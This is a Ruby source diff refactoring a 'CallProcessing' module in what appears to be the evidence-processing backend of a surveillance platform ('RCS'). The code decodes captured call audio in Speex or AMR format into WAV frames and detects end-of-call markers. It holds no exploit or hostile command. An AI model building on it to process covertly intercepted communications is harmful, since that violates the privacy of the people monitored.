@@ -1,59 +1,47 @@
 module RCS
 
-require 'rcs-worker/speex'
-require 'rcs-worker/audio_processor'
+require_relative '../speex'
+require_relative '../call_processor'
+require_relative 'audio_evidence'
 
 module CallProcessing
+  extend AudioEvidence
 
   attr_reader :wav
 
+  def end_call?
+    self[:data][:grid_content].bytesize == 4 and self[:data][:grid_content] == "\xff\xff\xff\xff"
+  end
+
   def process
-    
-    decoder = Speex.decoder_init(Speex.lib_get_mode(Speex::MODEID_UWB))
-    
-    # enable enhancement
-    enhancement_ptr = FFI::MemoryPointer.new(:int32).write_uint 1
-    Speex.decoder_ctl(decoder, Speex::SET_ENH, enhancement_ptr);
-    
-    # get frame size
-    frame_size_ptr = FFI::MemoryPointer.new(:int32).write_uint 0
-    Speex.decoder_ctl(decoder, Speex::GET_FRAME_SIZE, frame_size_ptr);
-    frame_size = frame_size_ptr.get_uint(0)
-        
-    raw_content = StringIO.new @content
-    wave_buffer = ''
-    
-    bits = Speex::Bits.new
-    Speex.bits_init(bits.pointer)
-    
-    while not raw_content.eof? do
-      len = raw_content.read(4).unpack("L").shift
-      chunk = raw_content.read(len)
-      unless chunk.nil?
-        buffer = FFI::MemoryPointer.new(:char, chunk.size)
-        buffer.put_bytes(0, chunk, 0, chunk.size)
-        
-        Speex.bits_read_from(bits.pointer, buffer, buffer.size)
-        
-        output_buffer = FFI::MemoryPointer.new(:float, frame_size)
-        Speex.decode(decoder, bits.pointer, output_buffer)
-        
-        # Speex outputs 32 bits float samples, wave needs 16 bit integers
-        wave_buffer += output_buffer.get_bytes(0, frame_size*4).unpack('F*').pack('S*')
-      end
+    self[:wav] = []
+
+    return if self[:data][:grid_content].nil?
+    if end_call?
+      trace :debug, "[CallProcessing] FINE CHIAMATA #{self[:data][:peer]}!!!"
+      return
     end
-    
-    Speex.bits_destroy(bits.pointer)
-    Speex.decoder_destroy(decoder)
-    
-    @wav = wave_buffer
-    
-=begin
-    channel = RCS::Worker::Channel.new self.sample_rate, self.start_time
-    channel.feed(@wav)
-    channel.to_wavfile
-=end
-    
+
+    codec = :amr if self[:data][:sample_rate] & LOG_AUDIO_AMR == 1
+    codec ||= :speex
+    self[:data][:sample_rate] &= ~LOG_AUDIO_AMR # clear codec bit if set
+
+    # speex decode
+    data = self[:data][:grid_content]
+    case self[:data][:program]
+      when "Mobile"
+        self[:wav] = Speex.get_wav_frames(data, Speex::MODEID_NB) if codec == :speex
+        self[:wav] = AMR.get_wav_frames data if codec == :amr # AMR.get_wav_frames data if codec == :amr
+      else
+        self[:wav] = Speex.get_wav_frames(data, Speex::MODEID_UWB) if codec == :speex
+        self[:wav] = AMR.get_wav_frames data if codec == :amr
+    end
+    #wav = Wave.new 1, self[:data][:sample_rate]
+    #wav.write "#{self[:data][:peer]}_#{self[:data][:start_time].to_f}_#{self[:data][:channel]}.wav", self[:wav]
+  end
+  
+  def type
+    :call
   end
   
 end
